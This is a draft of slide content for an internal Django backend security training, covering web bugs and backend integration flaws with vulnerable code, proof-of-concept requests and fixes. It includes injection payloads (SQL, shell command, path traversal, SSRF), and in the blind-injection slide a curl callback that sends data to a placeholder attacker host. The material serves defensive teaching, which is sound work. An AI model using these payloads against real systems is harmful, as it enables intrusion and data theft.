# Django Backend Security Training - Slide Data Draft

This is slide content data, not a designed presentation deck.

## Slide 1: Title

Django Backend Security

From Framework Safety Rails To Privileged Backend Mistakes

Speaker note:

This is the security-focused final session before the later blackbox CTF.

## Slide 2: Core Message

The application decides what should happen.

The infrastructure limits how bad it can get when the application is wrong.

Supporting points:

- Infrastructure security still matters.
- Application bugs and infrastructure controls protect different boundaries.
- A privileged backend becomes part of the security boundary.
- Defense in depth is about limiting blast radius.

## Slide 3: Session Shape

Part 1: Where Django Helps

- SQL injection
- XSS
- CSRF
- CORS clarification
- Clickjacking
- Open redirect / host trust
- Deployment security settings
- IDOR bridge

Part 2: Where The Backend Reaches Out

- File access
- Subprocess / RCE
- Outbound HTTP / SSRF
- Background task parameters
- Privileged integrations

Challenge placeholders:

- Whitebox Challenge 1
- Whitebox Challenge 2
- Final blackbox CTF

## Slide 4: Teaching Question

For every demo, ask:

> What does this code trust that it shouldn't?

Other useful prompts:

- Who chose this value?
- Is this value data, code, a path, a URL, or an action?
- Is the backend doing something with its own authority?

## Slide 5: Part 1 Intro

Where Django Helps

Django gives strong safety rails for classic web attacks, if we stay on them.

Main idea:

- Use the framework's safe path.
- Know when you are bypassing it.
- Django cannot infer your business rules.

## Slide 6: SQL Injection - Normal Behavior

Feature:

Search products by name or description.

Safe path:

- Django ORM builds parameterized queries.
- User input remains data.

Demo:

```text
/part1/sql/safe/?q=public
```

## Slide 7: SQL Injection - Vulnerable Code

Show:

```python
sql = f"""
    SELECT id, name, owner, description
    FROM demos_product
    WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'
"""
cursor.execute(sql)
```

Prompt:

> What happens when `q` changes the query structure?

## Slide 8: SQL Injection - PoC And Fix

PoC:

```http
GET /part1/sql/vulnerable/?q=' OR 1=1 --
```

Fix:

```python
cursor.execute(sql, [pattern, pattern])
```

Principle:

> Keep user input as data, not query code.

## Slide 9: XSS - Normal Behavior

Feature:

Upload a report file and preview it.

Safe path:

- Django templates escape the preview output by default.
- Uploaded HTML/SVG renders as text.

Demo:

```text
/part1/xss/upload/
```

## Slide 10: XSS - Vulnerable Code

Show:

```python
rendered = mark_safe(preview)
```

Prompt:

> Who decided this uploaded file is safe?

PoC:

```http
GET /part1/xss/preview/?name=welcome.svg
```

## Slide 11: XSS - Fix And Principle

Fix:

```python
rendered_body = format_html("{}", body)
```

Principle:

> User content should render as content, not code.

Mention:

- `safe`
- `mark_safe`
- autoescape off
- stored HTML needs special care

## Slide 12: CSRF - Normal Behavior

Feature:

Transfer demo credits.

Safe path:

- POST form includes CSRF token.
- Middleware checks user-specific secret.

Demo:

```text
/part1/csrf/safe/
```

## Slide 13: CSRF - Vulnerable Code

Show:

```python
@csrf_exempt
def csrf_vulnerable(request):
    ...
```

PoC:

Attack page silently submits a POST.

Demo:

```text
/part1/csrf/attack-page/
```

Principle:

> A logged-in browser is not proof that the user intentionally made the request.

## Slide 14: CORS Clarification

CSRF:

> Can another site make the victim's browser send a request with cookies?

CORS:

> Can another site's JavaScript read the response?

Principle:

> CORS controls who can read responses in the browser; CSRF controls whether state-changing requests require user intent.

## Slide 15: Clickjacking

Attack idea:

A malicious site frames the real app and tricks the user into clicking.

Django safety rail:

```python
"django.middleware.clickjacking.XFrameOptionsMiddleware"
```

Header:

```http
X-Frame-Options: DENY
```

Demo:

```bash
curl -i /part1/clickjacking/protected/
```

Principle:

> Some attacks trick the user into clicking the real app through a malicious frame.

## Slide 16: Open Redirect / Host Trust

Feature:

Redirect user after login/action.

Vulnerable code:

```python
next_url = request.GET.get("next", "/")
return redirect(next_url)
```

PoC:

```http
GET /part1/redirect/vulnerable/?next=https://example.com
```

## Slide 17: Open Redirect / Host Trust Fix

Fix:

```python
allowed = url_has_allowed_host_and_scheme(
    next_url,
    allowed_hosts={request.get_host()},
    require_https=request.is_secure(),
)
```

Principle:

> The user can request where to go next, but the server decides whether that destination is allowed.

Mention:

- `ALLOWED_HOSTS`
- `request.get_host()`
- don't read raw Host headers directly

## Slide 18: Deployment Security Settings

Not a local demo.

Show:

```python
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SECURE_HSTS_SECONDS = 31536000
```

Also:

```python
SECRET_KEY = os.environ["DJANGO_SECRET_KEY"]
```

Principle:

> Django has settings for browser and transport protections, but deployment must match the assumptions.

## Slide 19: IDOR Bridge

Django can help with generic web security problems.

It cannot infer business ownership rules.

Vulnerable shape:

```python
document = Document.objects.get(id=document_id)
```

Safer shape:

```python
document = get_object_or_404(
    Document,
    id=document_id,
    project__members=request.user,
)
```

Principle:

> Authentication answers "who are you?"
>
> Authorization answers "should you access this specific object?"

## Placeholder: Whitebox Challenge 1

Status:

Not designed yet.

Likely placement:

After Part 1.

Expected theme:

Interns inspect a small Django app and find places where Django's protections were bypassed.

Likely objectives:

- unsafe raw SQL search
- unsafe HTML rendering / XSS
- CSRF-exempt state-changing endpoint
- unsafe redirect
- small IDOR/object-authorization issue

To define later:

- exact app scenario
- flags
- hints
- expected solutions
- instructor walkthrough
- fixed implementations

## Slide 20: Part 2 Intro

Where The Backend Reaches Out

Django protects web boundaries well, but your backend often becomes a bridge to more powerful systems.

Examples:

- filesystem
- shell
- outbound HTTP
- background workers
- external privileged systems

## Slide 21: Path Traversal - Feature

Feature:

Download generated reports.

Dangerous question:

> Who chooses the file path?

Normal demo:

```text
/part2/files/vulnerable/?name=alice-summary.txt
```

## Slide 22: Path Traversal - Vulnerable Code

Show:

```python
name = request.GET.get("name")
path = REPORT_DIR / name
content = path.read_text()
```

PoC:

```http
GET /part2/files/vulnerable/?name=../private/internal-note.txt
```

Principle:

> Users choose resources, not filesystem paths.

## Slide 23: Path Traversal - Fix

Fix:

```python
ALLOWED_REPORTS = {
    "alice-summary": "alice-summary.txt",
}
filename = ALLOWED_REPORTS.get(report_id)
```

Teaching point:

Use server-side resource IDs or allowlists.

## Slide 24: Subprocess - Feature

Feature:

Run diagnostics for a backend target.

Dangerous question:

> When does input become command syntax?

Normal demo:

```text
/part2/subprocess/vulnerable/?target=api
```

## Slide 25: Subprocess - Visible RCE

Vulnerable code:

```python
command = f"echo checking-{target}"
subprocess.run(command, shell=True, ...)
```

PoC:

```http
GET /part2/subprocess/vulnerable/?target=api; id #
```

Result:

Command output appears in response.

## Slide 26: Subprocess - Blind Callback

Now the endpoint does not return command output.

PoC idea:

```http
GET /part2/subprocess/blind/?target=api; curl http://attacker/capture?leak=demo #
```

Then check attacker receiver:

```text
/part2/webhooks/events/
```

Teaching point:

> No output does not mean no execution.

## Slide 27: Subprocess - Blind Timing

PoC:

```bash
time curl '/part2/subprocess/blind/?target=api%3B%20sleep%202%20%23'
```

Teaching point:

> Timing can be a side channel.

Principle:

> Treat command execution as a privilege boundary.

## Slide 28: Subprocess - Fix

Fix:

```python
if target not in ALLOWED_DIAGNOSTIC_TARGETS:
    return HttpResponse("Unknown target", status=400)

subprocess.run(["printf", "checking %s\n", target])
```

Avoid:

- `shell=True`
- string-built commands
- arbitrary tool flags
- broad OS permissions

## Slide 29: Outbound Fetch / SSRF - Feature

Feature:

Test webhook or import from URL.

Dangerous question:

> What can the backend reach that the user cannot?

Normal demo:

```text
/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/public-api/
```

## Slide 30: SSRF - Vulnerable Code

Show:

```python
url = request.GET["url"]
with urlopen(url, timeout=2) as response:
    body = response.read(500)
```

PoC:

```http
GET /part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/
```

Principle:

> A URL fetch is not just input validation; it is network delegation.

## Slide 31: SSRF - Fix

Fix:

```python
if not is_allowed_demo_fetch(url):
    return HttpResponse("Blocked", status=400)
```

Mention:

- allow schemes/hosts
- block private/internal ranges
- handle redirects
- use timeouts
- add egress controls

## Slide 32: Background Task Parameters

Feature:

Schedule an export/report task.

Dangerous question:

> What does the worker trust later?

Vulnerable shape:

```python
action = request.GET["action"]
document_id = request.GET["document_id"]
enqueue_task(action=action, document_id=document_id)
```

PoC:

```http
GET /part2/tasks/vulnerable/?action=email_owner&document_id=2
```

## Slide 33: Background Task Fix

Fix:

```python
document = get_object_or_404(Document, owner=request.user.username)
enqueue_task(action="export", document_id=document.id)
```

Principle:

> Background work still needs authorization-aware inputs.

## Slide 34: Privileged Integration - Feature

Feature:

Backend performs an action in another system.

Dangerous question:

> Is the user steering the backend's authority?

Vulnerable shape:

```python
target_user = request.GET.get("target_user", user)
action = request.GET.get("action", "restart")
control_plane.perform(action, target_user)
```

## Slide 35: Privileged Integration - PoC And Fix

PoC:

```http
GET /part2/privileged/vulnerable/?user=alice&target_user=bob&action=snapshot
```

Fix:

```python
control_plane.perform("restart", user)
```

Principle:

> Do not let users freely steer privileged backend integrations.

## Placeholder: Whitebox Challenge 2

Status:

Not designed yet.

Likely placement:

After Part 2.

Expected theme:

Interns inspect a small SaaS/control-plane-like Django app and exploit integration mistakes.

Likely objectives:

- path traversal in file/report/log download
- subprocess injection with blind verification
- SSRF through URL import or webhook testing
- unsafe background task parameters
- unsafe privileged integration

To define later:

- exact business scenario
- flags
- hints
- expected solutions
- instructor walkthrough
- fixed implementations
- local/Kubernetes lab shape

## Slide 36: Defense In Depth

Application fixes:

- derive sensitive values server-side
- validate allowlists
- bind actions to authorized objects
- re-check worker invariants
- avoid shell execution
- validate outbound destinations

Infrastructure blast-radius controls:

- narrow service permissions
- egress controls
- namespace isolation
- admission policies
- separate risky workers
- fake/local secrets in labs

## Slide 37: Transition To CTF

You have seen the ingredients separately:

- classic web bugs
- framework safety rails
- object authorization gaps
- integration bugs
- privileged backend behavior

In the final blackbox CTF, these ideas will be hidden inside a SaaS-style app running in Kubernetes.

## Placeholder: Final Blackbox CTF

Status:

Not designed yet.

Expected placement:

After all pre-CTF teaching and exercises.

Expected direction:

A vulnerable SaaS/control-plane-like application running in a Kubernetes-flavored environment.

Likely ingredients:

- ordinary web vulnerabilities hidden behind realistic product features
- object-authorization mistakes
- integration bugs
- backend acting with more authority than the user
- infrastructure controls that limit blast radius

To define later:

- scenario
- attacker goals
- flags
- intended attack chain
- Kubernetes environment
- ServiceAccount permissions
- NetworkPolicies / admission controls
- instructor reset plan
- scoring and hint model

